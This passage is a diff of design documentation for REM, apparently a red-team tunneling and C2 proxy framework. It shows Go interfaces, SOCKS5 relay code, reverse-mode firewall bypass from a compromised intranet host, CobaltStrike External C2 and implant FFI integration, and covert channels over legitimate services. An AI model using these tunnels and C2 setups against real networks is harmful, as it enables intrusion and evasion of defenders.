+**Core Function of Outbound:** Handles protocol connection requests from user tools, parses protocol content, and establishes connections to target addresses. Outbound acts as the protocol server, responsible for understanding and responding to protocol requests.
 
-**Outbound Interface Definition**:
+**Outbound Interface Definition:**
+
+
 
 ```go
 type Outbound interface {
@@ -1058,11 +1220,11 @@ type Outbound interface {
 type OutboundCreatorFn func(options map[string]string, dial ContextDialer) (Outbound, error)
 ```
 
-- **conn io.ReadWriteCloser**: Connection with user tool (connection after Wrapper encryption, Mux multiplexing)
-- **realConn net.Conn**: Underlying transport layer connection (net.Conn provided by Tunnel)
-- **dial ContextDialer**: Dialer for initiating connections to target addresses, can be proxy dialer provided by proxyclient
+- `conn io.ReadWriteCloser`: Connection with the user tool (connection processed by Wrapper encryption and Mux multiplexing).
+- `realConn net.Conn`: Underlying transport layer connection (net.Conn provided by Tunnel).
+- `dial ContextDialer`: Dialer used to initiate connections to target addresses, which can be a proxy dialer provided by `proxyclient`.
 
-**SOCKS5 Outbound Implementation Example** (based on actual code from socks5.go):
+**SOCKS5 Outbound Implementation Example (based on actual code from socks5.go):**
 
 ```go
 type Socks5Plugin struct {
@@ -1081,8 +1243,8 @@ func (sp *Socks5Plugin) Handle(conn io.ReadWriteCloser, realConn net.Conn) (net.
         return nil, err
     }
 
-    // Use Server's Dial method to connect target address
-    // Dial here may be provided by proxyclient, supporting multi-level proxies
+    // Use Server's Dial method to connect to target address
+    // Dial here might be provided by proxyclient, supporting multi-level proxies
     target, err := sp.Server.Dial(ctx, req, wrapConn)
     if err != nil {
         return nil, err
@@ -1092,13 +1254,13 @@ func (sp *Socks5Plugin) Handle(conn io.ReadWriteCloser, realConn net.Conn) (net.
 }
 ```
 
-Outbound's workflow is: after receiving and parsing SOCKS5 requests transmitted through encrypted multiplexed tunnels, connect to real target through ContextDialer potentially containing multi-level proxies, ultimately establishing transparent data forwarding channel between user tool and target.
+The Outbound workflow involves receiving and parsing SOCKS5 requests transmitted over encrypted multiplexed tunnels, then connecting to the real target via a `ContextDialer` (which may contain multi-level proxies), ultimately establishing a transparent data forwarding channel between the user tool and the target.
 
-#### 3.1.2 Inbound: Relaying Protocol Requests to Remote End
+#### 3.1.2 Inbound: Relaying Protocol Requests to Remote Ends
 
-**Core Role of Inbound**: Relays locally received connections through protocol format to remote bridge connection. Inbound acts as protocol client role, responsible for encoding local requests as protocol format and sending to remote end.
+**Core Function of Inbound:** Relays locally received connections to a remote bridge connection via protocol format. Inbound acts as the protocol client, responsible for encoding local requests into protocol format and sending them to the remote end.
 
-**Inbound Interface Definition**:
+**Inbound Interface Definition:**
 
 ```go
 type Inbound interface {
@@ -1109,332 +1271,342 @@ type Inbound interface {
 type InboundCreatorFn func(options map[string]string) (Inbound, error)
 ```
 
-**Key Parameter Explanation**:
+**Key Parameters:**
 
-- **conn net.Conn**: Locally received connection (like TCP connection received by port forwarding)
-- **bridge io.ReadWriteCloser**: Bridge connection to remote end (connection processed by Tunnel, Wrapper, Mux)
+- `conn net.Conn`: Locally received connection (e.g., TCP connection received by port forwarding).
+    
+- `bridge io.ReadWriteCloser`: Bridge connection to the remote end (connection processed by Tunnel, Wrapper, Mux).
+    
 
-**SOCKS5 Inbound Implementation Example** (based on actual code from socks5.go):
+**SOCKS5 Inbound Implementation Example (based on actual code from socks5.go):**
 
-```
+```go
 func (sp *Socks5Plugin) Relay(conn net.Conn, bridge io.ReadWriteCloser) (net.Conn, error) {
-    // Parse SOCKS5 request from the local connection
+    // Parse SOCKS5 request from local connection
     req, err := sp.Server.ParseConn(context.Background(), conn)
     if err != nil {
         return nil, err
     }
 
-    // Build the SOCKS5 relay request and send it to the remote bridge
+    // Build SOCKS5 relay request, send to remote bridge
     _, err = bridge.Write(req.BuildRelay())
     if err != nil {
         return nil, err
     }
 
-    // Read the SOCKS5 response from the remote bridge
+    // Read SOCKS5 reply from remote bridge
     rep, addr, _ := socks5.ReadReply(bridge)
     if rep != socks5.RepSuccess {
         return nil, fmt.Errorf("relay failed: %v", rep)
     }
 
-    // Send a success reply back to the local connection
+    // Send success reply to local connection
     conn.Write(socks5.BuildSuccessReply(addr))
 
     return conn, nil
 }
 ```
 
-**Inbound workflow**:
+**Inbound Workflow:**
 
-1. Local app (e.g., port forwarding) receives a connection  
-2. Inbound parses the SOCKS5 request from the local connection  
-3. Encodes the request as SOCKS5 and sends it over the bridge  
-4. Remote Outbound processes the request and builds the target connection  
-5. Response returns via the bridge and Inbound forwards it to the local connection
+1. Local application (e.g., port forwarding) receives a connection.
+2. Inbound parses the SOCKS5 request from the local connection.
+3. Encodes the request into SOCKS5 protocol format and sends it to the remote end via `bridge`.
+4. Remote Outbound processes the request and establishes the target connection.
+5. Response returns via `bridge`, and Inbound forwards it to the local connection.
 
-#### 3.1.3 Reverse vs Proxy Modes: Inbound Placement Shapes the Topology
+#### 3.1.3 Reverse vs. Proxy Mode: Inbound Location Determines Network Topology
 
-**Core idea**: REM uses two modes—Reverse and Proxy—to decide **where the Inbound lives**, which in turn defines network topology and attack scenarios.
+**Core Essence:** REM controls where the Inbound resides via **Reverse** and **Proxy** modes, thereby realizing different network topologies and attack scenarios.
 
-**Essential responsibilities of Inbound and Outbound** (based on actual code from agent.go):
+**Essential Duties of Inbound and Outbound (based on actual code from agent.go):**
 
-```
-// handlerInbound: listen on a local port, accept user connections
+```go
+// handlerInbound: Listen on local port, accept direct user connections
 func (agent *Agent) handlerInbound(local, remote *core.URL, control *message.Control) error {
-    err := agent.ListenAndServe(local, control)  // listen on local port
-    instant, err := core.InboundCreate(local.Scheme, options)  // create Inbound
-    agent.Inbound = instant  // Inbound.Relay() relays user requests to the remote side
+    err := agent.ListenAndServe(local, control)  // Listen on local port
+    instant, err := core.InboundCreate(local.Scheme, options)  // Create Inbound
+    agent.Inbound = instant  // Inbound.Relay() relays user request to remote
     return nil
 }
 
-// handlerOutbound: receive relayed requests and connect to the target
+// handlerOutbound: Receive remote relayed requests, process protocol, connect to target
 func (agent *Agent) handlerOutbound(local, remote *core.URL, control *message.Control) error {
     instant, err := core.OutboundCreate(local.Scheme, options, core.NewProxyDialer(agent.client))
-    agent.Outbound = instant  // Outbound.Handle() processes protocol requests and dials targets
+    agent.Outbound = instant  // Outbound.Handle() processes protocol request, uses dialer to connect target
     return nil
 }
 ```
 
-- **Inbound = ListenAndServe + Relay**: Listen for user connections and relay them to the remote side  
-- **Outbound = Handle + Dial**: Process relayed protocol requests and connect to the real target  
-- **Same protocol implementation** (e.g., Socks5Plugin) implements both interfaces; mode selection decides which side runs which role
+- **Inbound = ListenAndServe + Relay:** Listen for user connections, relay to remote.
+- **Outbound = Handle + Dial:** Process relayed requests, connect to real target.
+- The same protocol (e.g., `Socks5Plugin`) implements both interfaces simultaneously; mode selection determines which interface is used.
+    
 
-**Reverse mode** (Inbound on the server side—firewall bypass):
+**Reverse Mode (Inbound at Server Side - Firewall Breach):**
+
+- **Topology:** User Tool → Server (External, isAccept=true) ← Client (Internal, Active Connect)
+- Data Flow:
+    
+    User → Server Listen:1080 → Inbound.Relay() → Tunnel Transport → Client → Outbound.Handle() → Internal Target
+    
+- **Server Side:**
+    - `ListenAndServe(:1080)` listens on SOCKS5 port.
+    - Inbound accepts user SOCKS5 connections.
+    - `Relay()` relays requests to Client.
+        
+- **Client Side:**
+    - Actively connects to Server to establish Tunnel.
+    - Outbound receives requests relayed by Server.
+    - `Handle()` parses SOCKS5, `Dial()` connects to internal target.
+
+- **Attack Value:** Client in the intranet actively connects to the external Server, bypassing inbound firewall restrictions. After compromising an internal machine, the Client actively calls out to establish a tunnel, allowing the user to access internal resources via the Server.
+    
+
+**Proxy Mode (Inbound at Client Side - Forward Proxy):**
+
+- **Topology:** User Tool → Client (User Side, isAccept=false) → Server (Target Network, isAccept=true)
+    
+- Data Flow:
+    
+    User → Client Listen:1080 → Inbound.Relay() → Tunnel Transport → Server → Outbound.Handle() → Target Network
+    
+- **Client Side:**
+    
+    - `ListenAndServe(:1080)` listens on SOCKS5 port.
+        
+    - Inbound accepts user SOCKS5 connections.
+        
+    - `Relay()` relays requests to Server.
+        
+- **Server Side:**
+    
+    - Client connects to Server to establish Tunnel.
+        
+    - Outbound receives requests relayed by Client.
+        
+    - `Handle()` parses SOCKS5, `Dial()` connects to target network.
+        
+- **Attack Value:** Server is located in the target network; user proxies access to the remote target network via local Client. Suitable for multi-level jump host scenarios where the Client can chain connections to multiple Servers.
+    
+
+**Mode Essence Comparison:**
+
+|**Mode**|**Inbound Location**|**User Connection**|**Target Connection**|**Typical Scenario**|
+|---|---|---|---|---|
+|**Reverse**|Server Side (External)|Connects to Server|Client connects to Internal|Firewall breach, Internal Penetration|
+|**Proxy**|Client Side (Local)|Connects to Client|Server connects to Target Network|Forward Proxy, Cascading Jump Host|
+
+**Supported Protocols (based on consts.go, bi-directional registration):**
+
+- `socks5` - SOCKS5 Proxy Protocol
+- `http` - HTTP Proxy Protocol
+- `ss` - Shadowsocks Protocol
+- `trojan` - Trojan Protocol
+- `forward` - Port Forwarding
+- `cs` - CobaltStrike External C2
+- `raw` - Raw TCP Forwarding
+- ....
+
+#### 3.1.4 Integration with Protocol Stack: Complete Link from Transport to Application
+
+**Complete Data Flow Path (Example: SOCKS5 in Reverse Mode):**
+
 
 ```
-Topology:
-User tool → Server (internet, isAccept=true) ← Client (intranet, outbound initiator)
-
-Flow:
-User → Server listening on :1080 → Inbound.Relay() → Tunnel transport
-  → Client → Outbound.Handle() → Intranet target
-
-Server side:
-  - ListenAndServe(:1080) to listen on SOCKS5
-  - Inbound receives user SOCKS5 connections
-  - Relay() sends requests to the Client
-
-Client side:
-  - Actively connects to the Server to build the Tunnel
-  - Outbound receives relayed requests
-  - Handle() parses SOCKS5, Dial() connects to intranet targets
-```
-
-**Attack value**: Client inside the intranet actively connects out to the internet Server, bypassing inbound firewall rules. After compromising an intranet machine, use the Client to dial out and build the tunnel; users access intranet resources via the Server.
-
-**Proxy mode** (Inbound on the client side—forward proxy):
-
-```
-Topology:
-User tool → Client (user side, isAccept=false) → Server (target network, isAccept=true)
-
-Flow:
-User → Client listening on :1080 → Inbound.Relay() → Tunnel transport
-  → Server → Outbound.Handle() → Target network
-
-Client side:
-  - ListenAndServe(:1080) to listen on SOCKS5
-  - Inbound receives user SOCKS5 connections
-  - Relay() sends requests to the Server
-
-Server side:
-  - Client connects to Server to build the Tunnel
-  - Outbound receives relayed requests
-  - Handle() parses SOCKS5, Dial() connects to the target network
-```
-
-**Attack value**: Server sits in the target network; the user proxies through the local Client to reach remote targets. Fits multi-hop/jump-box chains—Clients can chain multiple Servers.
-
-**Mode comparison**:
-
-| Mode    | Inbound location         | User connects to | Target connection from | Typical use case              |
-|---------|--------------------------|------------------|------------------------|--------------------------------|
-| Reverse | Server side (internet)   | Server           | Client → intranet      | Firewall bypass, intranet ops |
-| Proxy   | Client side (local)      | Client           | Server → target net    | Forward proxy, cascaded hops  |
-
-**Protocols already supported** (dual registration for both directions, based on consts.go):
-
-- **socks5** – SOCKS5 proxy protocol  
-- **http** – HTTP proxy protocol  
-- **ss** – Shadowsocks  
-- **trojan** – Trojan  
-- **forward** – Port forwarding  
-- **cs** – CobaltStrike External C2  
-- **raw** – Raw TCP forwarding
-
-#### 3.1.4 Integration with the Protocol Stack: Full Path from Transport to Application
-
-**End-to-end data path** (Reverse mode with SOCKS5):
-
-```
-User tool (port scanner)
-  ↓ [initiates SOCKS5 connection to Server:1080]
-Server-side Inbound (SOCKS5)
-  ↓ [parses SOCKS5 request, extracts target]
-  ↓ [sends to remote via bridge.Write()]
-Server-side Mux (Section 2.3.3)
-  ↓ [multiplex multiple SOCKS5 requests over one Tunnel]
-Server-side Wrapper chain (Section 2.3.2)
-  ↓ [encryption/obfuscation, e.g., AES-CFB → XOR → HTTP padding]
-Server-side Tunnel (Section 2.1)
-  ↓ [transport layer send: could be TCP/ICMP/DNS, etc.]
-  ↓ [may traverse proxyclient chain (Section 2.4)]
-Network transport
+User Tool (Port Scanner)
+  ↓ [Initiate SOCKS5 connection to Server:1080]
+Server Side Inbound (SOCKS5)
+  ↓ [Parse SOCKS5 request, extract target address]
+  ↓ [Send to remote via bridge.Write()]
+Server Side Mux (Section 2.3.3)
+  ↓ [Multiplexing, multiple SOCKS5 requests reuse single Tunnel]
+Server Side Wrapper Chain (Section 2.3.2)
+  ↓ [Encryption/Obfuscation, e.g., AES-CFB → XOR → HTTP Masquerade]
+Server Side Tunnel (Section 2.1)
+  ↓ [Transport Send, could be TCP/ICMP/DNS etc.]
+  ↓ [Possibly via proxyclient proxy chain (Section 2.4)]
+Network Transmission
   ↓
-Client-side Tunnel (Section 2.1)
-  ↓ [transport receive]
-Client-side Wrapper chain (Section 2.3.2)
-  ↓ [reverse decrypt: strip HTTP → XOR de-obfuscation → AES-CFB]
-Client-side Mux (Section 2.3.3)
-  ↓ [demux, dispatch to the right stream]
-Client-side Outbound (SOCKS5)
-  ↓ [Handle parses SOCKS5 request]
-  ↓ [ContextDialer connects to target]
-Intranet target (192.168.1.100:22)
+Client Side Tunnel (Section 2.1)
+  ↓ [Transport Receive]
+Client Side Wrapper Chain (Section 2.3.2)
+  ↓ [Reverse Decryption: HTTP Strip → XOR De-obfuscate → AES-CFB Decrypt]
+Client Side Mux (Section 2.3.3)
+  ↓ [Multiplex parsing, distribute to corresponding stream]
+Client Side Outbound (SOCKS5)
+  ↓ [Handle method parses SOCKS5 request]
+  ↓ [Use ContextDialer to connect to target]
+Intranet Target (192.168.1.100:22)
 ```
 
-**Where Outbound/Inbound sit in the stack**:
+**Position of Outbound/Inbound in Protocol Stack:**
 
-- **Top of application layer**: directly interfaces with user tools and target services  
-- **Depends on lower layers**: consumes Tunnel net.Conn, Wrapper encryption, Mux multiplexing, proxyclient dialers  
-- **Protocol agnostic**: underlying transport can be TCP/ICMP/DNS/WebShell; Outbound/Inbound do not care  
-- **Dynamically extensible**: register a new protocol by implementing the interfaces
+- **Top of Application Layer:** Directly facing user tools and target services.
+- **Dependent on Lower Layers:** Uses Tunnel's `net.Conn`, Wrapper's encryption, Mux's multiplexing, `proxyclient`'s proxies.
+- **Protocol Agnostic:** Underlying transport can be TCP/ICMP/DNS/WebShell; Outbound/Inbound does not care.
+- **Dynamic Scalability:** New protocols can be integrated simply by implementing the interface via the registration mechanism.
+    
 
-This application-layer abstraction lets REM flexibly mix protocols and modes, providing the unified app-layer foundation used across the attack scenarios in the following sections.
+This application layer abstraction allows REM to flexibly combine different protocols and modes, providing a unified application layer foundation for the various attack scenarios described in subsequent sections.
 
-### 3.2 Zero-Performance-Loss Proxy Protocol
+### 3.2 Zero Performance Loss Proxy Protocol
 
-Traditional proxy tools hit performance walls in **high-concurrency** scenarios (e.g., port scans). Numerous tiny SOCKS handshakes block and consume resources; mapping every connection to a real network connection creates heavy overhead.
+The performance bottleneck of traditional proxy tools mainly comes from concurrent processing, especially in high-concurrency scenarios like port scanning. A massive number of fragmented SOCKS handshake packets block and consume system resources, leading to a drastic decline in performance. Traditional tools map every connection to a real network connection, causing severe performance loss.
 
-Built on the Chapter 2 stack, REM’s breakthrough is **in-memory emulation of the SOCKS5 proxy protocol**. Via the memory transport layer, REM simulates SOCKS5 handshakes and data exchange directly in memory—no network I/O needed for the handshake phase.
+Based on the technical architecture in Chapter 2, REM's breakthrough solution is **Memory Simulation of SOCKS5 Proxy Protocol**. Through the memory transport layer, REM simulates the SOCKS5 handshake and data exchange process directly in memory, without actual network layer data transmission occurring.
 
-- When a scanner issues a connect, REM simulates the full SOCKS5 handshake in memory  
-- Many concurrent requests are scheduled and multiplexed in memory, avoiding real connection overhead  
-- Bulk data rides optimized tunnels that maximize bandwidth use
+- When a scanning tool initiates a connection request, REM simulates the complete SOCKS5 handshake flow in memory.
+- Multiple concurrent requests are scheduled and multiplexed in memory, avoiding the overhead of real network connections.
+- Batch data is transmitted via optimized tunnels, maximizing bandwidth utilization.
 
-**Real-world effect**:
+**Actual Application Effect:**
 
-- **Large-scale port scans**: one node can handle tens of thousands of concurrent scan connections with near-direct performance  
-- **Distributed brute force**: large-scale auth attempts over multi-level tunnels with no performance decay  
-- **High-rate API calls**: supports high-frequency API calls without proxy-layer bottlenecks
+- **Massive Port Scanning:** Single node can handle tens of thousands of concurrent port scans with performance approaching direct connection.
+- **Distributed Brute-forcing:** Large-scale authentication brute-forcing in multi-level tunnel environments with no performance decay.
+- **High-Frequency API Calls:** Supports high-frequency API interface calls unrestricted by proxy layer performance.
 
-This zero-overhead concurrency lets offensive tools perform at near-local speed even in complex network environments, greatly expanding tactical options.
 
-### 3.3 General-Purpose Protocol Chains Across Any Medium
+This zero-performance-loss concurrency handling capability allows attack tools to perform as if running locally even in complex network environments, greatly expanding the tactical choice space.
 
-#### Traditional Limits of Cascaded Network Attacks
+### 3.3 Universal Protocol Chain Across Arbitrary Media
 
-In complex adversarial environments, attackers often need **multi-level network pivots**. Traditional cascade tools have fundamental limits:
+Traditional Limitations of Cascading Network Attacks:
 
-**Evolution of traditional cascade tools**:
-- **Early**: relay-style port forwarders like lcx, ew  
-- **Modern**: in-memory SOCKS5/C2-style cascades like Stowaway, venom  
-- **Shared limits**: fixed protocol stacks, poor composability
+In complex network confrontation environments, attackers often face the challenge of multi-level network penetration. Traditional cascading tools have fundamental limitations:
 
-**Core issues**:
-- Protocol fingerprints: fixed smux/yamux traits, static stacks, and predictable handshakes are easy to detect  
-- Performance: stacked latency, conversion overhead, single points of failure degrade performance and stability
+**Evolution of Traditional Cascading Tools:**
 
-These constraints prompted REM’s rethinking of cascade design.
+- **Early Tools:** Relay-style port forwarding tools like `lcx`, `ew`.
+- **Modern Tools:** Memory-resident SOCKS5 C2-style cascading like `Stowaway`, `venom`.
+- **Common Limitations:** Reliance on fixed protocol stacks, lack of flexible combination capabilities.
 
-#### Real Cascade Scenarios
+Core Issues of Traditional Cascading:
 
-**Scenario 1: Standard three-tier network penetration**
+Traditional cascading modes suffer from exposed protocol signatures and performance bottlenecks. Regarding signatures, protocols like smux/yamux have fixed characteristics, static protocol stacks, and predictable handshake patterns that are easily identified by detection devices. regarding performance, accumulated latency across multiple layers, protocol conversion overhead, and single-point-of-failure risks lead to performance loss and stability issues in actual use. These fundamental limitations prompted the REM architecture to rethink cascading network design.
 
-```mermaid
-graph TB  
-    subgraph "网络拓扑：A(外网服务器) -- B(内网边界) -- C(内网核心)"  
-        direction LR  
-  
-        subgraph "节点A (外网服务器)"  
-            A[REM Console<br/>监听模式<br/>协议中继]  
-        end  
-  
-        subgraph "节点B (内网边界)"  
-            B[REM Agent<br/>双向通信<br/>协议转换]  
-        end  
-  
-        subgraph "节点C (内网核心)"  
-            C[REM Agent<br/>目标节点<br/>直接访问]  
-        end  
-  
-        A <--> B  
-        B <--> C  
-  
-        subgraph "统一REM网络协议栈"  
-            STACK[REM网络协议栈<br/>统一传输层抽象]  
-        end  
-  
-        A -.-> STACK  
-        B -.-> STACK  
-        C -.-> STACK  
-    end  
-  
-    style A fill:#e1f5fe  
-    style B fill:#fff3e0  
-    style C fill:#e8f5e8  
-    style STACK fill:#f3e5f5
+**Analysis of Actual Cascading Scenarios**
+
+Scenario 1: Standard Three-Level Network Penetration
+
+Topology: A (External Server) -- B (Perimeter) -- C (Core Internal)
+
+Plaintext
+
+```
+Node A (External)
+      |
+Node B (Perimeter)
+      |
+Node C (Core Internal)
 ```
 
-**Scenario 2: Cascading through WebShells**
+**REM Unified Network Protocol Stack**
 
-![](https://intranetproxy.alipay.com/skylark/lark/__mermaid_v3/2d95dbe9e60b9f3f572f158e04a29b8b.svg)
+Plaintext
 
-**Unlimited combinations of transport media**
+```
+REM Console <--> REM Agent <--> REM Agent <--> Target Node
+(Listen Mode)    (Bi-directional)   (Direct Access)
+(Protocol Relay) (Protocol Convert)
+```
 
-REM supports flexible mixing of transports: TCP, UDP, ICMP, WebSocket, SMB named pipes, HTTP APIs, etc. Any medium that can exchange data can be a cascade hop, letting attackers **build complex topologies** that merge previously isolated network zones into a unified offensive substrate—massively widening the reach of network-side operations.
+_Unified Transport Layer Abstraction_
+
+Scenario 2: WebShell Cascading Breach
+
+(Diagram implied: WebShell acts as a node in the chain)
+
+Infinite Combination of Transport Media
+
+The REM architecture supports flexible combinations of multiple transport media: TCP, UDP, ICMP, WebSocket, SMB Named Pipes, HTTP API, etc. Any medium with data exchange capability can become a cascading node, allowing attackers to build complex network topologies and reorganize originally isolated network zones into a unified attack infrastructure, significantly expanding the boundaries of network-side confrontation operations.
 
 ### 3.4 C2 Infrastructure Integration
 
-REM offers three integration depths for C2 frameworks, each with distinct advantages.
+REM provides three different levels of integration schemes for C2 frameworks, each with specific technical advantages and applicable scenarios.
 
-#### Reuse Proxy Channels
+Proxy Channel Reuse
 
-Bring up REM binaries to provide proxy channels; let the C2 reuse them via standard HTTP/SOCKS:
+Establish a proxy channel via the REM binary, allowing C2 to reuse it via standard HTTP/SOCKS proxy protocols. This is how the vast majority of proxy tools are currently used.
+
+_Technical Implementation:_
+
+Bash
 
 ```
-# Start REM proxy services
+# REM starts proxy service
 ./rem -c [rem_link] -m proxy -l socks5://:1080
 ./rem -c [rem_link] -m proxy -l http://:8080
 ```
 
-- **Standards-based**: HTTP/SOCKS5 so C2 frameworks need no changes  
-- **Port mapping**: REM listens on specified ports and forwards C2 traffic to targets  
-- **Protocol translation**: REM handles C2 protocol ↔ transport protocol conversion internally  
-- **Multi-protocol**: HTTP and SOCKS5 in parallel to fit different C2 needs
+- **Protocol Standardization:** Uses standard HTTP/SOCKS5 proxy protocols; C2 frameworks need no modification.
+- **Port Mapping:** REM listens on specified ports, forwarding C2 traffic to the target network.
+- **Protocol Conversion:** REM internally handles the conversion from C2 protocol to transport protocol.
+- **Multi-Protocol Support:** Supports both HTTP and SOCKS5 proxies, adapting to different C2 framework requirements.
 
-#### External C2 Protocol Overload
+External C2 Protocol Overloading
 
-Code: [https://github.com/chainreactors/rem/blob/master/protocol/serve/externalc2/externalc2.go](https://github.com/chainreactors/rem/blob/master/protocol/serve/externalc2/externalc2.go)  
-Official docs: [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm)
+Code: https://github.com/chainreactors/rem/blob/master/protocol/serve/externalc2/externalc2.go
 
-Use CobaltStrike External C2 to overload the C2 channel with REM as a special app-layer protocol.
+Official Docs: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm
+
+Uses the CobaltStrike External C2 mechanism to overload the C2 communication channel with REM as a special application layer protocol.
+
+_Technical Implementation:_
+
+Bash
 
 ```
-# Build an External C2 channel with REM
+# REM constructs External C2 channel
 ./rem -c [rem_link] -m proxy -l cs://:12345 -r raw://
 ```
 
-The implant (custom) and channel (REM-based) pair to carry C2 traffic.
+_Requires separate Implant (self-implemented) and channel (REM-based)._
 
-#### Embed into Any C2 Implant
+Embedded into Arbitrary C2 Implant
 
-Export REM core APIs as standard FFI via CGO for deep implant integration.
+Export REM's core API as a standard FFI interface via CGO, achieving deep integration with any C2 Implant.
 
-**FFI interface (based on the actual implementation signatures)**  
-Code: [https://github.com/chainreactors/rem/blob/master/cmd/export/main.go](https://github.com/chainreactors/rem/blob/master/cmd/export/main.go)
+FFI Interface Design
 
-```
-// REM agent connection - returns Agent ID, or NULL on failure
+Code: https://github.com/chainreactors/rem/blob/master/cmd/export/main.go
+
+**FFI Interface (based on actual signature implementation):**
+
+
+```c
+// REM Proxy Connect - Returns Agent ID, NULL on failure
 char* RemDial(char* cmdline);
 
-// Memory proxy connection - returns handle, or 0 on failure
+// Memory Proxy Connect - Returns connection handle, 0 on failure
 int MemoryDial(char* memhandle, char* dst);
 
-// Read from memory connection - returns bytes read, or 0 on failure
+// Memory Data Read - Returns bytes read, 0 on failure
 int MemoryRead(int chandle, void* buf, int size);
 
-// Write to memory connection - returns bytes written, or 0 on failure
+// Memory Data Write - Returns bytes written, 0 on failure
 int MemoryWrite(int chandle, void* buf, int size);
 
-// Close memory connection - returns 0 on success, else error code
+// Close Memory Connection - Returns 0 on success, error code on failure
 int MemoryClose(int chandle);
 
-// Clean up all Agent connections
+// Cleanup all Agent connections
 void CleanupAgent();
 ```
 
-**Build**
+**Compilation:**
 
-```
-# Shared library
+
+```bash
+# Compile Dynamic Link Library
 go build -buildmode=c-shared -o rem.dll -ldflags "-s -w" .\cmd\export\
-# Static library
+# Compile Static Link Library
 go build -buildmode=c-archive -o rem.a -ldflags "-s -w" .\cmd\export\
 ```
 
-**Usage example** (Rust FFI in IoM):
+**Actual Application Example: Rust Calling FFI in IoM**
 
-```
+```rust
 extern "C" {
     fn RemDial(cmdline: *const c_char) -> (*mut c_char, c_int);
     fn MemoryDial(memhandle: *const c_char, dst: *const c_char) -> (c_int, c_int);
@@ -1443,83 +1615,79 @@ extern "C" {
 }
 ```
 
-By overloading via FFI, REM wraps its **network comms** as standard APIs so any implant can call into near-zero-loss proxying, multiplexing, and protocol-agnostic transport. This turns REM from a **C2 comms enhancer** into a **C2 infrastructure component**, providing strong comms capability and stealth for modern C2 frameworks.
+In the IoM (Implants of Mine) project, calling REM's FFI interface via Rust achieved cross-language deep integration, encapsulating REM's network communication capabilities into low-level APIs similar to `libsocket`. Any Implant can obtain advanced network functions with near-zero performance loss through simple function calls.
 
-### 3.5 Transport-Layer Implementations over Any Channel
+Through FFI API overloading, REM encapsulates network communication capabilities into standard interfaces. This deep integration transforms REM from a C2 communication enhancement tool into a C2 infrastructure component, providing excellent communication capabilities and covertness for modern C2 frameworks.
 
-#### 3.5.1 Theoretical Basis for “Any Channel” Abstraction
+### 3.5 Transport Layer Implementation Based on Arbitrary Channels
 
-A key REM trait: **if data can be exchanged, it can be a REM transport layer**. This breaks the classic constraint on transport protocols and redefines “data-exchange medium” as “transport protocol.”
+#### 3.5.1 Theoretical Basis of Arbitrary Channel Abstraction
 
-**SMB named pipe case**
+An important feature of the REM architecture is: Theoretically, as long as data exchange exists, a REM transport layer can be built. This design philosophy effectively breaks the restrictions of traditional network tools on transport protocols, redefining "data exchange media" as "transport layer protocols."
 
-A REM transport built on remote SMB named pipes showcases this “any channel” abstraction:  
-[https://github.com/chainreactors/rem/blob/master/protocol/tunnel/unix/unix_windows.go](https://github.com/chainreactors/rem/blob/master/protocol/tunnel/unix/unix_windows.go)
+SMB Named Pipe Case
 
-**Core architecture analysis**
+The REM transport layer implemented based on remote SMB named pipes demonstrates REM's arbitrary channel abstraction capability.
 
-![](https://intranetproxy.alipay.com/skylark/lark/__mermaid_v3/f1c9d485340ef49d5435b590d6008d9b.svg)
+Code: https://github.com/chainreactors/rem/blob/master/protocol/tunnel/unix/unix_windows.go
 
-#### 3.5.3 Expanding the Transport Protocol Ecosystem
+#### 3.5.3 Expanding the Transport Layer Protocol Ecosystem
 
-**Currently implemented transports**
+**Implemented Transport Protocols:**
 
-- **TCP**
-- **UDP**
-- **ICMP**
-- **WebSocket**
-- **SMB命名管道**
-- **Unix Socket**
-- **DNS (DOH)**
+- TCP
+- UDP
+- ICMP
+- WebSocket
+- SMB Named Pipe
+- Unix Socket
+- DNS (DoH)
+- .....
 
-#### 3.5.4 lolC2: Duplex Channels via the ARQ Protocol
+#### 3.5.4 lolC2: Duplex Channel Application of ARQ Protocol
 
-[lolC2](https://lolc2.github.io/) hinges on repurposing legitimate services to exchange data, masking attack traffic as normal business traffic—a canonical Section 2.2 ARQ use case.
+The core idea of **lolC2** (Living off the Land C2) is using the original functions of legitimate services to exchange data, masquerading attack traffic as normal business traffic. In the REM architecture, this is a typical application scenario for the ARQ protocol from Section 2.2.
 
-**How it works**:
+Technical Implementation Principle:
 
-Many legitimate service APIs are inherently half-duplex: clients must initiate (HTTP polling, webhooks, social APIs, etc.). Using the Section 2.2 ARQ protocol, REM turns these into duplex channels:
+Many legitimate service APIs are essentially half-duplex channels—allowing only the client to initiate requests (e.g., HTTP protocol, webhooks, social media APIs). Through the ARQ protocol implemented in Section 2.2, REM encapsulates these half-duplex channels into duplex channels:
 
-- **HTTP polling**: client polls periodically to emulate bidirectional comms  
-- **Webhook callbacks**: use webhook push to simulate server-to-client sends  
-- **Social-media APIs**: comments/posts/etc. become covert message carriers
+- **HTTP Polling Mode:** Client periodically polls the server to retrieve data, simulating bidirectional communication.
+- **Webhook Callback Mechanism:** Uses webhook functions to enable server active push to clients.
+- **Social Media API:** Establishes covert channels via API interactions like comments and posts.
 
-**ARQ’s duplex role**:
+Role of ARQ Duplexing:
 
-ARQ provides reliability and duplex semantics on top of these one-way mechanisms. With buffering, framing, and polling control, a one-way channel behaves like a stable two-way transport for upper layers.
+The key role of the ARQ protocol here is to provide reliability guarantees and duplex communication capabilities for these unidirectional mechanisms. Through buffer management, data frame encapsulation, and polling control, channels that could originally only transmit unidirectionally can simulate stable bidirectional communication, providing standard transport layer services for upper-layer applications.
 
-By abstracting **any data-exchange-capable service** into a REM transport, covert comms gain tremendous flexibility.
+This allows any legitimate service capable of data exchange to become a REM transport layer, providing immense flexibility for covert communication.
 
-This “any channel” abstraction elevates REM from a “network proxy tool” to a “network protocol reconstruction platform,” giving network-side adversarial operations significant flexibility and room to grow.
+This arbitrary channel abstraction capability elevates REM from a "network proxy tool" to a "network protocol reconstruction platform," providing significant flexibility and expansion space for network-side confrontation operations.
 
 ---
 
-## 4. Summary and Vision
+## 4. Conclusion and Vision
 
-### 4.1 rem
+### 4.1 REM
 
-The first line of rem code was written in 2021. After several engineering and design-philosophy breakthroughs and rebuilds, it matured into a complete system.
+The first line of code for REM was written in 2021. In the interim, it underwent three or four major breakthroughs and reconstructions in engineering and design philosophy, finally forming a complete system.
 
